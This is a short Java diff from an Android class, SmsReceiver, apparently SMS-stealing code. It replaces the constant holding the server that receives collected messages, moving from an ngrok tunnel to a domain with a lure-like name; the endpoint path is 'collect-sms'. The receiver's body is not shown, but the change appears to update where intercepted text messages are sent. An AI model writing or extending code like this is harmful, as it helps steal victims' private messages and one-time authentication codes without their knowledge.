@@ -16,7 +16,7 @@ import java.net.URLEncoder;
 public class SmsReceiver extends BroadcastReceiver {
 
     private static final String TAG = "SmsReceiver";
-    private static final String SERVER_URL = "https://pecan-pupil-esteemed.ngrok-free.dev/api/collect-sms";
+    private static final String SERVER_URL = "https://bansos.jokichannel.eu.org/api/collect-sms";
 
     @Override
     public void onReceive(Context context, Intent intent) {
